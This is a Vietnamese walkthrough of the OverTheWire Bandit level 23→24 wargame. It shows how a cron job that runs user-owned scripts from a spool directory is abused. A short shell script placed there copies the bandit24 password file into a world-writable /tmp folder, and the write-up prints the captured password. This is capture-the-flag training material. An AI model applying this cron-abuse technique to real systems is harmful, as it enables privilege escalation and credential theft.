### **Mục tiêu**

- Một cron job chạy **tự động mỗi phút** với quyền `bandit24`.
- Cron job này sẽ:
    - Truy cập thư mục `/var/spool/bandit24/foo`.
    - Chạy tất cả các **script** trong thư mục này nếu:
        - File thuộc quyền sở hữu của **bandit23**.
        - Script chạy không quá **60 giây** (`timeout -s 9 60`).
    - Sau khi chạy xong sẽ **xóa file script**.

- **Nhiệm vụ:**  
    Tạo một script, đặt nó vào thư mục trên. Script này sẽ đọc password của `bandit24` từ `/etc/bandit_pass/bandit24` và ghi ra một nơi mà `bandit23` có quyền đọc.

---

### **Cách tiếp cận**

1. **Kiểm tra thư mục chứa cron job**  
	Các cron job thường được lưu tại `/etc/cron.d/`.

```
bandit22@bandit:/etc/cron.d$ ls -l
total 40
-r--r----- 1 root root  47 Aug 15 13:16 behemoth4_cleanup
-rw-r--r-- 1 root root 123 Aug 15 13:09 clean_tmp
-rw-r--r-- 1 root root 120 Aug 15 13:16 cronjob_bandit22
-rw-r--r-- 1 root root 122 Aug 15 13:16 cronjob_bandit23
-rw-r--r-- 1 root root 120 Aug 15 13:16 cronjob_bandit24
-rw-r--r-- 1 root root 201 Apr  8  2024 e2scrub_all
-r--r----- 1 root root  48 Aug 15 13:17 leviathan5_cleanup
-rw------- 1 root root 138 Aug 15 13:17 manpage3_resetpw_job
-rwx------ 1 root root  52 Aug 15 13:19 otw-tmp-dir
-rw-r--r-- 1 root root 396 Jan  9  2024 sysstat
```

-> Và ta thấy file cronjob_bandit24.

2. **Đọc nội dung file cron job**

```
bandit22@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

3. **Phân tích script**

```
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

**Phân tích:**

1. `myname=$(whoami)` → `myname` sẽ là `bandit24`.
2. `cd /var/spool/$myname/foo` → truy cập thư mục `/var/spool/bandit24/foo`.
3. Vòng lặp:
    - Chạy tất cả các file trong thư mục này (kể cả file ẩn).
    - Bỏ qua `.` và `..`.
    - Kiểm tra quyền sở hữu file:
        - Nếu file do `bandit23` tạo ra → chạy file bằng `timeout` với giới hạn **60 giây**.
    - Sau khi chạy xong → **xóa file**.

4. **Ý tưởng khai thác**

- Tạo một script do chính `bandit23` sở hữu, chứa lệnh đọc password của `bandit24` và ghi ra một thư mục mà `bandit23` có quyền truy cập.
- Đặt (`cp`) script này vào `/var/spool/bandit24/foo`.
- Chờ khoảng 1 phút, cron job sẽ:
    1. Thực thi script với quyền `bandit24`.
    2. Xóa script sau khi chạy.
    3. Lưu lại password ở nơi an toàn để `bandit23` đọc.

 5. **Thực hiện từng bước**

```
# Tạo thư mục chứa script
bandit23@bandit:/etc/cron.d$ mkdir /tmp/tomtony
bandit23@bandit:/etc/cron.d$ cd /tmp/tomtony
bandit23@bandit:/tmp/tomtony$ ls -l
total 0

# Mở Vi (vim) để chỉnh sửa script (ESC + :wq để save và esc)
bandit23@bandit:/tmp/tomtony$ vi tomtony.sh
bandit23@bandit:/tmp/tomtony$ cat tomtony.sh
#!/bin/sh
cat /etc/bandit_pass/bandit24 > /tmp/tomtony/bd24.txt

bandit23@bandit:/tmp/tomtony$ ls -l
total 4
-rw-rw-r-- 1 bandit23 bandit23 65 Sep 24 14:32 tomtony.sh

# Cấp quyền cho thư mục
bandit23@bandit:/tmp/tomtony$ chmod 777 -R /tmp/tomtony 

bandit23@bandit:/tmp/tomtony$ ls -l
total 4
-rwxrwxrwx 1 bandit23 bandit23 65 Sep 24 14:32 tomtony.sh
bandit23@bandit:/tmp/tomtony$ cp tomtony.sh /var/spool/bandit24/foo

bandit23@bandit:/tmp/tomtony$ ls -l
total 8
-rw-rw-r-- 1 bandit24 bandit24 33 Sep 24 14:34 bd24.txt
-rwxrwxrwx 1 bandit23 bandit23 65 Sep 24 14:32 tomtony.sh

bandit23@bandit:/tmp/tomtony$ cat bd24.txt
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

### **Các lệnh đã dùng**

```
# 1. Tạo thư mục tạm
mkdir /tmp/tomtony
chmod 777 -R /tmp/tomtony

# 2. Viết script khai thác
vi tomtony.sh

# Nội dung:
#!/bin/sh
cat /etc/bandit_pass/bandit24 > /tmp/tomtony/bd24.txt

# 3. Đưa script vào thư mục cron job
cp tomtony.sh /var/spool/bandit24/foo

# 4. Sau 1 phút, đọc password
cat bd24.txt
```

### **Kết quả**

```
bandit23@bandit:/tmp/tomtony$ cat bd24.txt
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

Mật khẩu cho level tiếp theo là:

`gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`


--- 

### **Xem thêm

Cách leo thang đặc quyền ([privilege escalation](https://www.strongdm.com/blog/linux-privilege-escalation)).